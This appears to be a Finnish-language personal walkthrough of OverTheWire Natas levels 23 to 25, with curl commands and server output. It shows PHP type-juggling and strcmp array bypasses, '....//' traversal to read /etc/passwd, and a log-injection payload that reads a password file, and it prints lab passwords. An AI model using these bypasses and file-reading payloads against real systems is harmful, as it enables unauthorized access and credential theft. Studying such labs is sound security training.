<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas23.natas.labs.overthewire.org left intact


## vastaus:

Tässä tason harjoituksessa ideana oli lukea sitä index-source.html välilehteä, koska siinä PHP koodi pätkässä oli pieni vastaus - ja olisi pitänyt arvattakin.

Tässä funktiossa osassa: `if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 ))` - tämä on se vastaus, jossa lomake hyväksyy salasansa, **jos syötettään merkkijonoa "iloveyou"**, ja samalla se on arvoa suurempi kuin 10. Ehkä tässä on yksityiskohta, kun verrataan merkijonoa suuruusvertailuna luku on 10.

Testasin normaalisti sen "iloveyou", että "passwd" mutta vinkkien mukaan se onkin vastauksena: **"11iloveyou"**. Ehkä outoimmista on se mistä ja miten se on tullut toi numero "11" siihen ja + "iloveyou"?.

The credentials for the next level are:
Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd




Tämä on sama vastaus mutta testasin url perään toi osuus, mutta on toista tapaakin.

```
┌──(kali㉿kali)-[~]
└─$ curl "http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou" --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Tämä se toinen taikatemppu, joka voi simulida käyttäjän syöte lomakekenttää. Just tämän kenttän tyyppiä `<input type="text" name="passwd">` , kuten tässä harjoituksen-tasossa. 

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://natas23.natas.labs.overthewire.org/ \
     -d "passwd=11iloveyou" \
     --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


## pieni teoria

Ongelmana, että miksi php koodissa yhdessä rivissä on näin `if(strstr($_REQUEST["passwd"], "iloveyou") && ($_REQUEST["passwd"] > 10))` - ja harjoituksena tässä mukaan on **weak password** - eli heikko salasana.


Tässä yksi outoina on se miksi alkuun tulee "11" ja sitten "iloveyou" -merkkijono, ja silti toimisikaan normaalisti jos menisi "iloveyou11".


PHP:n tyyppimuunnoslogiikka on tässä se "peculiarity" eli erikoisuus, johon tehtävän ratkaisu perustuu:

```
- 🔤 `strstr($_REQUEST["passwd"], "iloveyou")` → vaatii, että merkkijonossa esiintyy sana "iloveyou"
- 🔢 `$_REQUEST["passwd"] > 10` → vaikka `passwd` on merkkijono, PHP muuntaa sen automaattisesti numeroksi, jos se alkaa numerolla
```

Tässä tapauksessa "11iloveyou" tulkittuna numeroksi 11, koska PHP lukee merkkijonon alusta numerot ja jättää lopun pois tyyppimuunnoksensa. Voi olla koska 11 on suurempi kuin 10 (11 > 10) ja "iloveyou" mukana, molemmat ehdot täyttyvät.

PHP yrittää vertailla merkkijonoa lukuarvoon. Jos merkkijono alkaa numerolla, PHP tulkitsee sen automaattisesti numeroksi. → "11iloveyou" alkaa numerolla → PHP muuntaa sen luvuksi 11 on suurempi kuin 10.

PHP koodissa voi tarkoittaa näin:
- Jos merkkijono alkaa numerolla, PHP muuntaa sen numeroksi vertailun ajaksi
- Toisena jos merkkijono ei ala numerolla, PHP tulkitsee sen numeroks 0


Salasana-parametrissa numero pitää olla alussa, jotta PHP tulkitsee sen vertailussa numeroksi. Vasta silloin ehto > 10 voi toteutua. Esimerkiksi 11iloveyou toimii, koska "iloveyou" sisältyy arvoon ja alkuosa 11 täyttää vertailuehdon. Harjoituksen ydinidea liittyy **heikkoon salasanatarkistukseen**: vihje ei suoraan kertonut missä kohtaa "iloveyou" pitää olla tai että vertailu tehdään numerona. Testatessa toimii arvot kuten 11iloveyou, 3459iloveyou, ja muut numerot, jotka ovat suurempia kuin 10 — kunhan ne alkavat numerolla ja sisältävät sanan "iloveyou".


Tämä taulukko havainnollistaa, miten PHP käsittelee `$_REQUEST["passwd"] > 10` -vertailua merkkijonojen kanssa, ja miksi jotkut syötteet toimivat ja toiset eivät.

| Syöte (`passwd`)   | Sisältää "iloveyou"? | Alkaako numerolla? | PHP tulkinta numerona | > 10 täyttyy? |
|--------------------|-----------------------|----------------------|------------------------|----------------|
| `11iloveyou`       | ✅                    | ✅                   | `11`                   | ✅             |
| `iloveyou11`       | ✅                    | ❌                   | `0`                    | ❌             |
| `5iloveyou`        | ✅                    | ✅                   | `5`                    | ❌             |
| `99iloveyou`       | ✅                    | ✅                   | `99`                   | ✅             |
| `iloveyou`         | ✅                    | ❌                   | `0`                    | ❌             |
| `love11iloyou`     | ❌                    | ✅                   | `11`                   | ✅             |


---

# natas 24 - START HERE;

The credentials for the next level are:
Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd

Tämä voi olla sama kuin aikaisepi taso eli natas 23 - level, mutta ainakin huomattua siinä **view-source.html** koodissa on pientä muutosta verrattuna aikaisempaa tasoon.


```
<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Ainakin tämä osuus `if(!strcmp($_REQUEST["passwd"], "<censored>"))` - tarkoitta:
- PHP vertaa syötettyä arvoa, et tarkasti johonkin kovakoodattuun arvoon (tähän sensoroituun) salasanasa.
- `strcmp()` tekee tarkan  merkkijonon vertialunsa ja `!strcmp()` on totta avin, jos molemmat merkkijojnot ovat täsmälleen samat.

Tämän `strmcp()` funktiossa tapahtuu vertailee merkkijononsa aakkosjärjestyksessä (ASCII-arvojen mukaan):


Tämä `morla / 10111` - ei liity mitenäkään tähän ja se on normi joku käyttäjäprofiili tai kotihakemisto tai muu taustainen tunnistus.

- Palauttaa < 0, jos string1 on "pienempi" kuin string2 
- Palauttaa > 0, jos string1 on "suurempi" kuin string2
- Palauttaa 0, jos ne ovat täsmälleen samat


Samahan tässä vihjettä ei annettu, sekä ei ole varmasti alkavana numerona + "iloveyou" ja jne, että voi olla menee sinne tietokantaan tai muualle, että pitäisikö testata sillä robots.txt? 


## Kali inux robots.txt ja tarkistus

Ajattelisin kokeilla esim. kali linux *oman* robots.txt et sillä laittaa sen polun eli */etc/robots.txt* ja siitä natas24 url etusivunsa. Oma pieni hahmottamisen komento `$curl /etc/robots.txt http://natas24.natas.labs.overthewire.org --user natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd` - muuten hyvä idea ja tämä ei ehkä toimisi. Aikaisempien levelissä oli `/robots.txt` tarjolla url peränsä, mutta tätä ei ole tarjolla uudestaan koska tarkistettuna sitä ei ole olemassa.

NÄMÄ EI TOIMI:
```
curl http://natas24.natas.labs.overthewire.org/robots.txt --user natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
curl http://natas24.natas.labs.overthewire.org/secret/ --user natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```

curl on tarkoitettu lähettämään pyyntöjä etänä oleville verkkopalvelimille, ja se ei voi liittää oman koneen tiedostoa (esim. /etc/robots.txt) toisen palvelimen osoitteeseen. Robots.txt voi olla verkkosivuston oma tiedoston polun alla, jota palvelin itse tarjoaa — eikä se tule käyttjältä. Yleensä robots.txt ei välttmättä ole verkkosivustojen palvelimen allakaan yleensä turvallisuuden kannalta ja sama pätee **/s3cr3ts.txt**


Kokeiltu aikaisempia tarkistuksia esim. yksi niistä on se url perässä on se polku kuten `?lang=../../../../etc/passwd` ja pien kertauksena toi tiedoston polku esim. `/var/www/natas/natas24/` tai sitä vastaavaa, josta voi lukea salaisuudensa.



Seuraava testausta:
Tässä tapahtuu strcmp-testaus komentorivi, jossa antaa tuloksena negatiivisen luvun just tämän ensimmäinen testin.

📌 Mitä `php -r` tekee?
- php: suorittaa PHP:n komentotulkinnan
- `-r`: kertoo, että komento annetaan suoraan ilman tiedostoa
- `'echo strcmp("a", "password");'`: ajaa echo-lauseen ja näyttää tuloksen

┌──(kali㉿kali)-[~]
└─$ php -r 'echo strcmp("a", "password");'
-15                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ php -r '$x = strcmp("a", "password"); echo ($x === 0 ? "Equal" : ($x < 0 ? "a < password" : "a > password"));'
a < password                                                                                                                                      


Tässä harjoituksen levelissä siis peini lisäetsintä aiheesta “strcmp-funktion ohittaminen” johdatti minut CSAW-nimiseen CTF-tehtävään. Siinä pelaajat onnistuivat **ohittamaan vertailun kokonaan** saattamalla `$password`-muuttujan arvoksi NULL, joka PHP:ssä vastaa arvoa `0`. He tekivät tämän asettamalla $password:n merkkijonon sijasta taulukoksi (`array`). Ja Natas24:n lähdekoodissa ei ole mitään tarkistusta, joka estäisi meitä tekemästä niin.


Periaatteessa syötämällä `?passwd[]=arvo` URL:iin, `$_REQUEST["passwd"]` muuttuu taulukoksi → ja ohitat salasanatarkistuksen


## Ratkaisu

Eli edellisen lauseen mukaan tosiaan kokonaisen URL perään pitäisi sijoittaa pientä muutosta eli syötämällä `?passwd[]=arvo`. Jos alkuun syöttää esim. URl perään `?passwd=test` eli "http://natas24.natas.labs.overthewire.org?passwrd=test" - niin tietenkin se toimii, mutta se ei ole virallisen tämän tason *salasanan* vastaus. 

Toiminnallaan pitäisi syöttää ja antaa pientä muutosta: "http://natas24.natas.labs.overthewire.org/?passwd[]=test" 


The credentials for the next level are:
Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws


---

# natas 25 - START HERE;

Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws


Ensimmäisen kirjauduttua joku lorem ipsum quote runoilu sivusto, ja siinä voi valita kielensä et menee joko oletuksena (eng) tai vaihtaa to saksan kieleksi. 


**view-source.html** koodissa on ainakin muutama funktio, josta koskien tämä pieni runoilu teksit säkeistöstä että sallii vaihtakielensä ja oletuksena se on englanniksi.

Tässä on jotakin vinkkejä annettu koskien "directory traversal attempt" , ja tiedostojen polku tyyppiä, että tekee funktioiden tarkistusta ja palauttamista, että sen korvaamisen suojaa tiedostopolkua.

🕵️‍♂️ logRequest()-funktio tallentaa session-tunnukseen perustuvan lokin tiedostoon, mikä on selvä vihje, että lokien polku voi paljastaa salaisuuksia. just tämä `/var/www/natas...`.

Erikseen on funktio kirjauttumisen pyyntö viesti, että annettu tällainen polku vinkkinä:

```
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

Tämä Natas25 taso liittyy vahvasti haavoittuvuuteen nimeltä local file inclusion (LFI) ja mahdolliseen session-id -manipulointiin. Session-id kenttään tulee toi kirjautuneen evästeen PHPSESSID value. Sekä tässä lokituksessa ($log) termistössä on mainintana date (päiväys ja kellonaikakin), että normi lokituksen dataa.

Tässä kun valitsee kielensä esim. eng tai tanskaksi se kyllä muuttaa samantien sivuston URL perään `/?lang=en` ja sama pätee saksaksi `/?lang=de`- tämä voi kertoa jotakin tulostuksena tiedoston polkua.


Tässä alemmassa funktiossa, niin tässä tapahtuu **bypassing the ../ check** osa. Ainakin tässä mainuttu on tiedoston polku ja monta mahtaa olla kyseessä? Kokeillaan laitaa muutama piste ja kautakauta  että antaako mitään eli `....//`.


- Tässä `$filename, "../"` 

```
// check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
```

🔐 Mitä funktiossa tapahtuu?

PHP-koodissa yritetään suojautua hakemistohyökkäyksiltä (directory traversal) — eli tilanteilta, joissa käyttäjä yrittää päästä käsiksi tiedostoihin menemällä takaisin hakemistorakenteessa `../.`

🚧 Miksi tämä ei riitä?
Kirjoittaja kertoo, että vaikka `../` poistetaan, on mahdollista kiertää suoja käyttämällä erikoismuotoa: `....//`


Koodi yrittää estää tiedostojen luvattoman lukemisen poistamalla `../`, mutta fiksu hyökkääjä voi kiertää tämän käyttämällä `....//`, joka toimii samoin mutta ei jää suodatukseen kiinni.

Tämä on klassinen esimerkki siitä, miten **suodatus ei riitä** — pitää käyttää esim. **täydellistä polun normalisointia tai whitelist-pohjaista sisällytystä.**


## kali linux - START HERE;

Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws


Tämä voisi olla hyvä alku pohja checkkaus et ottaa ton kirjautuneen evästeen datansa eli (F12 --> application --> cookies / <http://natas-pitkä-url> --> PHPSESSID <value>)


1. Hyödynnettään `session_id()` - pohjaista tiedostopolkua

PHP tallentaa session-tiedisto polkuun kuten: **/var/www/natas/natas25/logs/natas25_<session_id>.log
** 

Kokeillaan jotakin lokitiedosotn sisältö ja joskus sieltä voi löytyä salasanansa tai muuta hyödyllistä dataa ja pyörittäen tätä curl komento pohjaa:

```
curl "http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_<session_id>.log" \
  --user natas25:<salasana> \
  --cookie "PHPSESSID=<session_id>"

```


Toinen esim. kokeilla directory traversal hyökkäystä:

`curl "http://natas25.natas.labs.overthewire.org/?lang=../../../../etc/passwd" \
  --user natas25:<salasana>`


Tai lukea natas salasanoja:
`curl "http://natas25.natas.labs.overthewire.org/?lang=../../../../natas_webpass/natas25" \
  --user natas25:<salasana>`



URL kautta:

Voit testata molempia hyökkäystapoja myös suoraan selaimen URL-riviltä, aivan kuten curl tekee komentoriviltä

🌐 1. Lang-parametrin kautta tiedoston lukeminen selaimella:
`http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_7cbgukbicl92os5d1a9icj81l5.log`


Kirjautuneena selaimessa, evästeet kulkevat automaattisesti → ei tarvitse syöttää käyttäjää/salasanaa manuaalisesti


🔐 2. Sama idea kuin curl, mutta selaimen kautta

curl vain tekee saman HTTP-pyynnön komentoriviltä — mutta URL:in rakenne on täsmälleen sama kuin selainkäytössä.

ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

```
curl "http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_<abd_value>.log" \
  --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws \
  --cookie "PHPSESSID=<abcd_value>"
```

`http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_abcd1234.log`


Jos istuntosi on aktiivinen ja eväste mukana, saat saman tuloksen kuin curlilla


```
┌──(kali㉿kali)-[~]
└─$ curl "http://natas25.natas.labs.overthewire.org/?lang=../../../../etc/passwd" \
  --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```
┌──(kali㉿kali)-[~]
└─$ curl "http://natas25.natas.labs.overthewire.org/?lang=.../logs/natas25_7cbgukbicl92os5d1a9icj81l5.log" \
  --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws \
  --cookie "PHPSESSID=7cbgukbicl92os5d1a9icj81l5"     
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```
curl -i --user natas25:7cbgukbicl92os5d1a9icj81l5 "http://natas25.natas.labs.overthewire.org/"
```

```
┌──(kali㉿kali)-[~]
└─$ curl -i --user natas25:7cbgukbicl92os5d1a9icj81l5 "http://natas25.natas.labs.overthewire.org/"          
HTTP/1.1 401 Unauthorized
Date: Wed, 23 Jul 2025 16:29:06 GMT
Server: Apache/2.4.58 (Ubuntu)
WWW-Authenticate: Basic realm="Authentication required"
Content-Length: 481
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at natas25.natas.labs.overthewire.org Port 80</address>
</body></html>
```

```
curl -Headers "Referer: http://natas6.natas.labs.overthewire.org/" http://natas25:7cbgukbicl92os5d1a9icj81l5@natas25.natas.labs.overthewire.org


curl http://natas25.natas.labs.overthewire.org/ --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```

```
┌──(kali㉿kali)-[~]
└─$ curl http://natas25.natas.labs.overthewire.org/ --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws          

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```                                                                           

```
┌──(kali㉿kali)-[~]
└─$ curl http://natas25.natas.labs.overthewire.org/?lang=....// --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<br />
<b>Warning</b>:  include(/var/www/natas/natas25): failed to open stream: No such file or directory in <b>/var/www/natas/natas25/index.php</b> on line <b>38</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'language/../' for inclusion (include_path='.:/usr/share/php') in <b>/var/www/natas/natas25/index.php</b> on line <b>38</b><br />
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## UI selain kautta

http://natas25.natas.labs.overthewire.org/?lang=....//....//
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/passwd


Seuraavaksi otettaan tämä funktio osuus kuitenkin huomioina ja se polku osuus ja sitä haluttaan lisätä siihen url perään ja pätee toi evästeen PHPSESSID <value> ja kirjautuneen value id. - Toi on se vihje eli sijoitettaan se 

```
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

PHPSESSID value: 7cbgukbicl92os5d1a9icj81l5

http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_7cbgukbicl92os5d1a9icj81l5.log


m82if8u2gmmdqdirqfhmol20ao


http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_m82if8u2gmmdqdirqfhmol20ao.log

seuraavaksi pitää avata Burp suite

## Burp suite

jotenkin pitää syöttää tämä osuus sinne burp suite ohjelman alle 

**<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>**



Set-Cookie: PHPSESSID=0d1ck1lr02r290orfdh7tbr6eo; 

Set-Cookie: PHPSESSID=clm0l501a75614put36bof6gj4; 


[23.07.2025 17::52:51] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 "Directory traversal attempt! fixing request."


vastaus:

[24.07.2025 09::36:04] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." [24.07.2025 09::36:47] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request." 

[24.07.2025 09::37:16] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." [24.07.2025 09::37:37] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request." 

[24.07.2025 09::38:23] "Directory traversal attempt! fixing request." [24.07.2025 09::47:51] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." [24.07.2025 09::48:18] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request." [24.07.2025 09::48:50] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request."





https://learnhacking.io/overthewire-natas-level-25-walkthrough/

https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas25.md

https://n0j.github.io/2017/07/18/otw-natas-25.html

